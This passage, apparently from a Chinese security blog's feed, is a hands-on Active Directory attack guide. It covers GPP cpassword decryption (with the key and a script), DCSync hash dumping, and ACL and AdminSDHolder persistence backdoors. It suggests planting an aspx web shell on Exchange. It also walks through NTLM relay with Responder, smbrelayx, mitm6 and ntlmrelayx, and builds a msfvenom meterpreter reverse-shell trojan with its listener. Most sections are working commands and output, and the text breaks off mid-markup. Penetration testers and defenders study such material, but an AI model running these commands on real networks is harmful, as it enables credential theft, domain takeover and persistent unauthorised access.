alt="1568190671139"></p><p>组策略配置完成，域内主机重新登录，即可应用此策略</p><p>在对应的文件夹下能找到配置文件Groups.xml，具体路径如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\0day.org\SYSVOL\0day.org\Policies\&#123;05F24259-49D8-481A-8408-567DC3155838&#125;\User\Preferences\Groups</span><br></pre></td></tr></table></figure><p>Groups.xml内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;Groups clsid=&quot;&#123;3125E937-EB16-4b4c-9934-544FC6D24D26&#125;&quot;&gt;&lt;User clsid=&quot;&#123;DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1&#125;&quot; name=&quot;Administrator (内置)&quot; image=&quot;2&quot; changed=&quot;2019-09-11 08:29:51&quot; uid=&quot;&#123;32DED100-2B0D-41CB-8341-F5FBCF77FE13&#125;&quot;&gt;&lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;Hd/xxCN9bFRTj8C2az+0t3el0u3Dn68pZ1Sd4IHmbPw&quot; changeLogon=&quot;0&quot; noChange=&quot;0&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; subAuthority=&quot;RID_ADMIN&quot; userName=&quot;Administrator (内置)&quot;/&gt;&lt;/User&gt;</span><br><span class="line">&lt;/Groups&gt;</span><br></pre></td></tr></table></figure><p>cpassword项，保存的是加密后的内容<code>&quot;Hd/xxCN9bFRTj8C2az+0t3el0u3Dn68pZ1Sd4IHmbPw&quot;</code></p><p>加密方式为AES 256，虽然目前AES 256很难被攻破，但是微软选择公开了该AES 256加密的私钥，地址如下：</p><p><a href="https://msdn.microsoft.com/en-us/library/cc422924.aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/cc422924.aspx</a></p><p>借助该私钥，我们就能还原出明文</p><p>采用Chris Campbell @obscuresec开源的powershell脚本，地址如下：</p><p><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1" target="_blank" rel="noopener">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p><p>该脚本可在域内主机上执行，能够自动查询共享文件夹\SYSVOL中的文件。</p><p>也可以利用如下代码进行解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import sys</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">from base64 import b64decode</span><br><span class="line"></span><br><span class="line">if(len(sys.argv) != 2):</span><br><span class="line">  print &quot;decrypt.py &lt;cpassword&gt;&quot;</span><br><span class="line">  sys.exit(0)</span><br><span class="line"></span><br><span class="line">key = &quot;&quot;&quot;4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b&quot;&quot;&quot;.decode(&apos;hex&apos;)</span><br><span class="line">cpassword = sys.argv[1]</span><br><span class="line">cpassword += &quot;=&quot; * ((4 - len(cpassword) % 4) % 4)</span><br><span class="line">password = b64decode(cpassword)</span><br><span class="line">out = AES.new(key, AES.MODE_CBC, &quot;\x00&quot; * 16)</span><br><span class="line">out = out.decrypt(password)</span><br><span class="line">print out[:-ord(out[-1])].decode(&apos;utf16&apos;)</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568191571479.png" alt="1568191571479"></p><h4><span id="通过group-policy-management-console-gpmc-实现计划任务的远程执行">通过Group Policy Management Console (GPMC) 实现计划任务的远程执行</span></h4><p>同上创建GPO，在计划任务中添加。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568192348420.png" alt="1568192348420"></p><p>第四个任务选项会在每次组策略刷新时执行。</p><p>四种计划任务的区别可参考官方文档：</p><p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc770904(v%3dws.11" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc770904(v%3dws.11</a>)</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568192727717.png" alt="1568192727717"></p><p>对于域内的主机，可以等待90分钟使组策略自动更新，也可以在客户端执行如下命令强制刷新组策略：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpupdate /force</span><br></pre></td></tr></table></figure><h3><span id="dcsync">DCSync</span></h3><h4><span id="利用dcsync导出域内所有用户hash的方法">利用DCSync导出域内所有用户hash的方法</span></h4><p><strong>利用条件：</strong></p><p>获得以下任一用户的权限：</p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>导出域内所有用户的hash：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:rootkit.org /all /csv&quot; exit</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568197137085.png" alt="1568197137085"></p><h4><span id="利用dcsync在域内维持权限的方法">利用DCSync在域内维持权限的方法</span></h4><p><strong>利用条件：</strong></p><p>获得以下任一用户的权限：</p><ul><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li></ul><p><strong>利用原理：</strong></p><p>向域内的一个普通用户添加如下三条ACE(Access Control Entries)：</p><ul><li>DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</li><li>DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</li><li>DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)</li></ul><p>该用户即可获得利用DCSync导出域内所有用户hash的权限。</p><p>Windows系统中的ACL(Access Control List)，用来表示用户（组）权限的列表。</p><p><strong>利用方法：</strong></p><p>利用PowerView.ps1，添加ACE的命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=0day,DC=org&quot; -PrincipalIdentity webadmin -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568202728574.png" alt="1568202728574"></p><p>删除ACE的命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-DomainObjectAcl -TargetIdentity &quot;DC=0day,DC=org&quot; -PrincipalIdentity webadmin -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure><p>在域内一台登录了sqladmin用户的主机上面，就能使用mimikatz的DCSync功能</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe privilege::debug &quot;lsadump::dcsync /domain:0day.org /all /csv&quot; exit</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568203197954.png" alt="1568203197954"></p><h3><span id="adminsdholder">AdminSDHolder</span></h3><p>AdminSDHolder是一个特殊的AD容器，具有一些默认安全权限，用作受保护的AD账户和组的模板</p><p>Active Directory将采用AdminSDHolder对象的ACL并定期将其应用于所有受保护的AD账户和组，以防止意外和无意的修改并确保对这些对象的访问是安全的</p><p>如果能够修改AdminSDHolder对象的ACL，那么修改的权限将自动应用于所有受保护的AD账户和组，这可以作为一个域环境权限维持的方法</p><h4><span id="向adminsdholder对象添加acl">向AdminSDHolder对象添加ACL</span></h4><p>使用PowerView，添加用户dbadmin 的完全访问权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-ObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=rootkit,DC=org&quot;  -PrincipalIdentity dbadmin -Verbose -Rights All</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568215397075.png" alt="1568215397075"></p><p>默认等待60分钟以后，dbadmin获得对所有受保护的AD账户和组的完全访问权限</p><p>可以通过修改注册表的方式设置权限推送的间隔时间，注册表位置如下：</p><ul><li>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters,AdminSDProtectFrequency,REG_DWORD</li></ul><p>例如修改成等待60秒的命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add hklm\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v AdminSDProtectFrequency /t REG_DWORD /d 60</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568215431765.png" alt="1568215431765"></p><p>dbadmin用户可以直接访问域控。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568215569041.png" alt="1568215569041"></p><h4><span id="删除adminsdholder中指定用户的acl">删除AdminSDHolder中指定用户的ACL</span></h4><p>删除用户dbadmin的完全访问权限，命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Remove-DomainObjectAcl -TargetSearchBase &quot;LDAP://CN=AdminSDHolder,CN=System,DC=rookit,DC=org&quot; -PrincipalIdentity dbadmin -Rights All -Verbose</span><br></pre></td></tr></table></figure><h3><span id="非常规方法">非常规方法</span></h3><p>若域控主机为owa主机，即exchange服务器主机，我们可以在owa目录下留一个aspx的木马。用作维持权限。</p><p>在如下目录中加入一个aspx木马。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1568213801260.png" alt="1568213801260"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3&gt;&lt;span id=&quot;黄金票据&quot;&gt;黄金票据&lt;/span&gt;&lt;/h3&gt;&lt;h4&gt;&lt;span id=&quot;简介&quot;&gt;简介&lt;/span&gt;&lt;/h4&gt;&lt;p&gt;Golden Ticket（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>域渗透-Relay</title>
    <link href="https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Relay.html"/>
    <id>https://uknowsec.cn/posts/notes/域渗透-Relay.html</id>
    <published>2019-09-02T14:17:17.000Z</published>
    <updated>2019-09-02T15:56:22.758Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="相关概念">相关概念</span></h3><h4><span id="ntlm-hash-和-net-ntlm-hash">NTLM hash 和 Net-NTLM hash</span></h4><p><strong>NTLM hash是指Windows系统下Security Account Manager中保存的用户密码hash</strong></p><p>该hash的生成方法：</p><ol><li>将明文口令转换成十六进制的格式</li><li>转换成Unicode格式，即在每个字节之后添加0x00</li><li>对Unicode字符串作MD4加密，生成32位的十六进制数字串</li></ol><p>在渗透测试中，通常可从Windows系统中的SAM文件和域控的NTDS.dit文件中获得所有用户的hash，通过Mimikatz读取lsass.exe进程能获得已登录用户的NTLM hash</p><p><strong>Net-NTLM hash是指网络环境下NTLM认证中的hash</strong></p><p>NTLM认证采用质询/应答（Challenge/Response）的消息交换模式，流程如下：</p><ol><li>客户端向服务器发送一个请求，请求中包含明文的登录用户名。服务器会提前存储登录用户名和对应的密码hash</li><li>服务器接收到请求后，生成一个16位的随机数(这个随机数被称为Challenge),明文发送回客户端。使用存储的登录用户密码hash加密Challenge，获得Challenge1</li><li>客户端接收到Challenge后，使用登录用户的密码hash对Challenge加密，获得Challenge2(这个结果被称为response)，将response发送给服务器</li><li>服务器接收客户端加密后的response，比较Challenge1和response，如果相同，验证成功</li></ol><p>在以上流程中，登录用户的密码hash即<code>NTLM hash</code>，response中包含<code>Net-NTLM hash</code></p><p>在NTLM认证中，NTLM响应分为NTLM v1，NTLMv2，NTLM session v2三种协议，不同协议使用不同格式的Challenge和加密算法</p><p>所以也就存在不同协议的Net-NTLM hash，即Net-NTLM v1 hash，Net-NTLM v2 hash</p><p>从攻击角度来看</p><ul><li><p>可以利用NTLM哈希值进行“哈希传递”攻击</p></li><li><p>无法利用Net-NTLM哈希值来进行“哈希传递”攻击</p></li></ul><h4><span id="ntlm和smb的关系">NTLM和SMB的关系</span></h4><p>SMB的认证可以基于NTLM协议或者kerberos协议，前者使用了hash，后者使用了ticket，是构成SMB的<code>PtH</code>和<code>PtT</code>攻击的基础。<br>NTLM 并没有定义它所依赖的传输层协议。NTLM 消息的传输完全依赖于使用 NTLM 的上层协议来决定，可以是SMB，也可以是TCP，亦或HTTP。</p><h4><span id="跨协议的-ntlm-relay">跨协议的 NTLM-Relay</span></h4><p>前面说过，NTLM 的上层协议基本可以是任何协议（如果上层是基于UDP 的协议的话，可能会不一样），所以这引出了跨协议的 NTLM-Relay 技巧。无论 NTLM 的上层协议是什么，其携带的 NTLM 的三条消息都是</p><p>由 NTLM SSP 生成的，所以上层协议在 relay 的过程中，是可以被替换掉的。</p><p>比如从 http relay 至 smb，从 smb relay 至 ldap/mssql 等等。我们只需要将一个协议中的 NTLM 消息取出来，然后原样不动的地放入另一个协议，就完成了上层协议转换的过程。</p><h3><span id="smb-relay">SMB RELAY</span></h3><p>mitm Attacker通过不停的转换机器角色来同时欺骗Smb server和Client两端，可以拿着Client的凭据去访问Smb Server中的资源,如果这个凭据的用户权限在smb server中很大,大到可以随意操作smb server,此时凭据再一旦认证成功,随后再立即执行一段shellcode,那Smb server基本也就沦陷了。</p><p><img src="https://img-blog.csdnimg.cn/20190613153528283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dzMTMxMjk=,size_16,color_FFFFFF,t_70" alt="img"></p><h4><span id="利用条件">利用条件</span></h4><h5><span id="smb版本信息">SMB版本信息</span></h5><p>不同Windows版本所对应的Smb 版本，smb版本越高，内置的安全机制就越完善,利用难度也就越大，另外，它默认工作在tcp/udp的139和445端口上,属上层协议[偏应用层]。</p><ul><li>Smb v1 主要用于xp/2003以下的系统中</li><li>Smb v2.x    主要用于win vista/7/2008/2008r2</li><li>Smb v3.x    主要用于win 8 / 8.1 / 2012 / 2012r2 /2016</li></ul><h5><span id="利用条件">利用条件</span></h5><ul><li>目标机器不能开启smb签名，否则利用无效,一般情况下,windows server会默认开启,而windows单机系统[win 7/8/8.1/10]默认都不会开。</li><li>对一些打了ms08-068[KB957097]补丁的老系统[比如windows xp/2003以下的系统]利用也是无效的。</li></ul><h5><span id="检查是否开启smb签名">检查是否开启smb签名</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sT -p 445 --open --script smb-security-mode,smb-os-discovery 192.168.0.106,192.168.0.108</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567261949153.png" alt="1567261949153"></p><h4><span id="利用方式">利用方式</span></h4><h5><span id="inveigh">Inveigh</span></h5><p>powershell编写，可供参考的地址：</p><p><a href="https://github.com/Kevin-Robertson/Inveigh" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Inveigh</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Inveigh.psd1</span><br><span class="line">Invoke-Inveigh -consoleoutput Y</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567264625758.png" alt="1567264625758"></p><p>再使用另外一个主机去连接该服务器。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567264636716.png" alt="1567264636716"></p><p>原主机上就可以捕获到net-ntlm v2 hash。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567264727529.png" alt="1567264727529"></p><p>拿到net-ntlm v2 的hash以后,可以用hashcat进行爆破</p><p>Hashcat参数如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 net-ntlm hash  /tmp/password.list -o found.txt --force</span><br></pre></td></tr></table></figure><p>若已获取权限的主机上存在web服务，我们可以在网站里插一个带有unc路径的图片，它请求资源走的是smb[file://]。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;\\192.168.3.68\test.jpg&quot;</span><br></pre></td></tr></table></figure><p>当有主机访问该主页是，我们也能在<code>Inveigh</code>捕获到该主机的net-ntlm v2 hash。</p><h5><span id="smb_relay">smb_relay</span></h5><p>在kali 192.168.22.128利用<code>windows/smb/smb_relay</code>模块进行攻击。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use windows/smb/smb_relay</span><br><span class="line">msf5 exploit(windows/smb/smb_relay) &gt; set smbhost 192.168.22.162</span><br><span class="line">smbhost =&gt; 192.168.22.162</span><br><span class="line">msf5 exploit(windows/smb/smb_relay) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(windows/smb/smb_relay) &gt; set lhost 192.168.22.128</span><br><span class="line">lhost =&gt; 192.168.22.128</span><br><span class="line">msf5 exploit(windows/smb/smb_relay) &gt; set lport 2333</span><br><span class="line">lport =&gt; 2333</span><br><span class="line">msf5 exploit(windows/smb/smb_relay) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/smb_relay):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SHARE    ADMIN$           yes       The share to connect to</span><br><span class="line">   SMBHOST  192.168.22.162   no        The target SMB server (leave empty for originating system)</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT  445              yes       The local port to listen on.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br><span class="line">   LHOST     192.168.22.128   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     2333             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br></pre></td></tr></table></figure><p>在192.168.22.130上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.22.128\c$ /user:&quot;administrator&quot; &quot;1qaz@wsx&quot;</span><br></pre></td></tr></table></figure><p>在kali上就可以看到回显了</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567307751364.png" alt="1567307751364"></p><p>回显里会删除exe文件，所以建议在配置时做好进程迁移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set AutoRunScript post/windows/manage/migrate</span><br></pre></td></tr></table></figure><h5><span id="smbrelayxpy">smbrelayx.py</span></h5><p>在工具主机kali 192.168.22.128上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbrelayx.py -h 192.168.22.162</span><br></pre></td></tr></table></figure><p>在内网主机192.168.22.130上执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.22.128\c$ /user:&quot;administrator&quot; &quot;1qaz@wsx&quot;</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567273119541.png" alt="1567273119541"></p><p>此时在主机kali 192.168.22.128上就能捕获到如下内容。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567273079956.png" alt="1567273079956"></p><p>当目标内网有机器192.168.22.130访问到我们的恶意smb服务器192.168.22.128后,便会抓取对应机器的net-ntlm v2 hash,之后再通过smbrelayx.py脚本拿着这段抓到的hash去尝试重放192.168.22.162这台目标机器。一旦重放成功,便会把162这台机器的本地用户及密码hash全部解密导出来。</p><p>smbrelayx.py可以执行命令和上传木马文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbrelayx.py -h 192.168.22.162 -c whoami</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567273321968.png" alt="1567273321968"></p><p>结合msf上传exe木马。生成一个exe木马。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.22.128 LPORT=4444 -e x86/shikata_ga_nai -f exe -o test.exe</span><br></pre></td></tr></table></figure><p>启用<code>msfconsole</code>中<code>exploit/multi/handler</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 192.168.22.128</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> AutoRunScript post/windows/manage/migrate</span><br><span class="line">msf exploit(multi/handler) &gt; exploit -j</span><br><span class="line">[*] Exploit running as background job 1.</span><br><span class="line">[*] Started reverse TCP handler on 192.168.138.136:4444</span><br></pre></td></tr></table></figure><p>执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbrelayx.py -h 192.168.22.162 -e test.exe</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567273781547.png" alt="1567273781547"></p><h5><span id="responder">Responder</span></h5><p>自从MS08-068漏洞修复之后无法再将<code>Net-NTLM</code>哈希值传回到发起请求的机器上，除非进行跨协议转发，但是该哈希值仍然可以通过中继转发给另外一台机器。利用Responder结合其他中继工具可以进行自动化的拦截并且对哈希值进行中继转发。唯一的一个不足之处就是，在这之前需要在进行转发操作的机器上禁用SMB签名。</p><blockquote><p>在开启了 SMB Signing 的情况下，在 SMB 协议利用 NTLM SSP 进行了身份验证后，后续的所有数据包，都会利用 NTLM SSP 生成的这个 session key 进行签名。SMB 服务端收到后续的数据包后，也会检查数据包的签名，如果签名不对，则拒收。<br>NTLM SSP 在生成 session key 的时候，会需要用到账号密码的原始 LM HASH 或 NT HASH。而 relay 型的攻击，都是站在一个中间人的位置，我们是不可能知道原始的 LM HASH 或 NT HASH 的（如果知道了也就不需要 Relay 这种攻击手法了）。所以，我们是无法计算出来这个 session key 的，自然也就无法对数据包进行签名。</p></blockquote><p>Responder通过设置几个模拟的恶意守护进程（如SQL服务器，FTP，HTTP和SMB服务器等）来直接提示凭据或模拟质询 – 响应验证过程并捕获客户端发送的必要 hash。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python Responder.py -I eth0 -v</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567274431769.png" alt="1567274431769"></p><p>对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录。所以在192.168.22.130上执行<code>dir \\192.168.22.128\c$</code></p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567274565897.png" alt="1567274565897"></p><p>在192.168.22.128上就可以得到NTLMv2 Hash。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1567274630365.png" alt="1567274630365"></p><p>responder只有一个回显hash功能，可以结合<code>ntlmrelayx.py</code>和<code>Empire框架</code>进行进一步利用。再借助<code>DeathStar</code>，可以很轻易获取windows的域管理权限。</p><h3><span id="ntlm-relay">NTLM-Relay</span></h3><h4><span id="ntlm-relaying与kerberos委派组合">NTLM Relaying与Kerberos委派组合</span></h4><h5><span id="实现方法">实现方法</span></h5><p>在目标计算机上创建一个新的计算机账号B，并为本地计算机账号A设置基于资源的约束委派给新建账号B，使得B可以模拟用户访问A的资源，便能通过S4U攻击（首先使用S4U2Self获取任意用户到新建计算机账号B的服务票据，再使用S4U2Proxy获取该用户到目标计算机A的服务票据），使用该计算机账号为域内任意用户请求访问该计算机任意服务的TGS服务票据，从而获得该计算机的SYSTEM权限。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/91b3eb5d0f25dd7b4f371fcf6bc26d24.png" alt="img"></p><h5><span id="利用过程">利用过程</span></h5><p>使用mitm6选择目标计算机并回复DHCPv6请求，为其分配地址，回复WPAD配置文件地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mitm6 -hw ws02 -d lab.local --ignore-nofqnd</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/2019-04-14-12-43-22.png" alt="img"></p><p>设置目标LDAP服务器地址并创建WPAD配置文件，使用“–delegate-access”为目标创建计算机账号并配置基于资源的约束委派：</p><p>启动ntlmrelayx，指定域控制器，委派攻击，禁用SMB服务器并设置将生成并提供给目标的恶意WPAD文件的名称。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntlmrelayx.py -t ldaps://dc01.lab.local --delegate-access --no-smb-server -wh attacker-wpad</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/2019-04-14-12-44-15.png" alt="img"></p><p>当目标计算机重启或重新进行网络配置（如重新插入网线）时， 将会向DHCPv6发送请求获取IPv6配置，我们已经使用mitm6接管DNS，此时目标计算机便会访问kali获取WPAD配置文件，并将kali设置为为代理服务器 。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/2019-04-14-12-58-20.png" alt="img"></p><p>然后当目标计算机通过kali代理服务器访问网络时，kali将会向目标计算机发送代理的认证请求，并中继NTLM认证到LDAP服务器上，完成相关操作。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/2019-04-14-13-31-11.png" alt="img"></p><p>上图中已经完成了计算机账号的创建，并为其设置了基于资源的约束委派。接下来，便可通过impacket中的getST脚本，使用新创建的计算机账号为域管理员（或具有本地管理员权限的域用户）请求访问到该计算机的CIFS服务票据：</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/2019-04-14-15-09-39.png" alt="img"></p><p>导入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=lkys.ccache</span><br></pre></td></tr></table></figure><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/2019-04-14-15-10-52.png" alt="img"></p><p>然后就可以通过psexec.py远程执行命令了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 